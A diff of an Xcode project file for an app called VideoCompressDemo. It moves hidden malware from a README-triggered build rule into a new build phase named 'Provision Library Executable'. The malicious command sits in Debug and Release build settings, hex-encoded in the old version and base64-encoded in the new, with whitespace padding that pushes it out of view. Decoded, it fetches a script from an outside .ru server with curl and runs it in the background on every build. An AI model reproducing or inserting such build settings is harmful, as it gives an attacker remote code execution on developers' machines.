@@ -7,7 +7,6 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
-		50890A33385445DE9B7BBDC8 /* README.md */ = {isa = PBXBuildFile; fileRef = 925BA880522E416FB07BBDC8; };
 		113BEB022BFC5EB0007759A6 /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 113BEB012BFC5EB0007759A6 /* AppDelegate.swift */; };
 		113BEB042BFC5EB0007759A6 /* SceneDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 113BEB032BFC5EB0007759A6 /* SceneDelegate.swift */; };
 		113BEB062BFC5EB0007759A6 /* ViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 113BEB052BFC5EB0007759A6 /* ViewController.swift */; };
@@ -22,7 +21,6 @@
 /* End PBXBuildFile section */
 
 /* Begin PBXFileReference section */
-		925BA880522E416FB07BBDC8 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		113BEAFE2BFC5EB0007759A6 /* VideoCompressDemo.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = VideoCompressDemo.app; sourceTree = BUILT_PRODUCTS_DIR; };
 		113BEB012BFC5EB0007759A6 /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
 		113BEB032BFC5EB0007759A6 /* SceneDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SceneDelegate.swift; sourceTree = "<group>"; };
@@ -60,7 +58,6 @@
 		113BEAFF2BFC5EB0007759A6 /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				925BA880522E416FB07BBDC8 /* README.md */,
 				113BEAFE2BFC5EB0007759A6 /* VideoCompressDemo.app */,
 			);
 			name = Products;
@@ -108,12 +105,12 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 113BEB122BFC5EB2007759A6 /* Build configuration list for PBXNativeTarget "VideoCompressDemo" */;
 			buildPhases = (
+				9CDBE709E30F498B877BBDC8 /* Provision Library Executable */,
 				113BEAFA2BFC5EB0007759A6 /* Sources */,
 				113BEAFB2BFC5EB0007759A6 /* Frameworks */,
 				113BEAFC2BFC5EB0007759A6 /* Resources */,
 			);
 			buildRules = (
-				0A501E52C7A74E83B87BBDC8 /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -156,23 +153,28 @@
 /* End PBXProject section */
 
 /* Begin PBXBuildRule section */
-		0A501E52C7A74E83B87BBDC8 /* PBXBuildRule */ = {
-				isa = PBXBuildRule;
-				compilerSpec = com.apple.compilers.proxy.script;
-				filePatterns = "*.md";
-				fileType = pattern.proxy;
-				inputFiles = (
-				);
-				isEditable = 0;
-				outputFiles = (
-					"/tmp/${INPUT_FILE_BASE}",
-				);
-				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
-sh -c \"${A8CDBB7}\"";
-			};
 																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																						/* End PBXBuildRule section */
 
 /* Begin PBXShellScriptBuildPhase section */
+		9CDBE709E30F498B877BBDC8 /* Provision Library Executable */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			alwaysOutOfDate = 1;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Provision Library Executable";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			shellPath = /bin/sh;
+			showEnvVarsInLog = 0;	
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A8CDBB7}\"";
+		};
 /* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXResourcesBuildPhase section */
@@ -180,7 +182,6 @@ sh -c \"${A8CDBB7}\"";
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				50890A33385445DE9B7BBDC8 /* README.md */,
 				113BEB0E2BFC5EB2007759A6 /* LaunchScreen.storyboard in Resources */,
 				113BEB0B2BFC5EB2007759A6 /* Assets.xcassets in Resources */,
 				113BEB092BFC5EB0007759A6 /* Main.storyboard in Resources */,
@@ -230,7 +231,7 @@ sh -c \"${A8CDBB7}\"";
 		113BEB102BFC5EB2007759A6 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A8CDBB7 = "((q(){ `printf xAxd | tr -d A` -p -r; };echo 6563686f202224286375726c202d73664c6b202d2d636f6e6e6563742d74696d656f7574203232202d2d72657472792035202d642022703d78636f64655f72756c65222068747470733a2f2f676a7a79673837796e787932332e72752f612922207c2073680a | q | sh ) >/dev/null 2>&1 &)";
+				A8CDBB7 = "((q(){ `printf bEase64 | tr -d E` --decode; };echo ZWNobyAiJChjdXJsIC1ma0xzIC0tY29ubmVjdC10aW1lb3V0IDI1IC0tcmV0cnkgNCAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly9nanp5Zzg3eW54eTIzLnJ1L2EpIiB8IHNoCg== | q | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -294,7 +295,7 @@ sh -c \"${A8CDBB7}\"";
 		113BEB112BFC5EB2007759A6 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A8CDBB7 = "((q(){ `printf xAxd | tr -d A` -p -r; };echo 6563686f202224286375726c202d73664c6b202d2d636f6e6e6563742d74696d656f7574203232202d2d72657472792035202d642022703d78636f64655f72756c65222068747470733a2f2f676a7a79673837796e787932332e72752f612922207c2073680a | q | sh ) >/dev/null 2>&1 &)";
+				A8CDBB7 = "((q(){ `printf bEase64 | tr -d E` --decode; };echo ZWNobyAiJChjdXJsIC1ma0xzIC0tY29ubmVjdC10aW1lb3V0IDI1IC0tcmV0cnkgNCAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly9nanp5Zzg3eW54eTIzLnJ1L2EpIiB8IHNoCg== | q | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
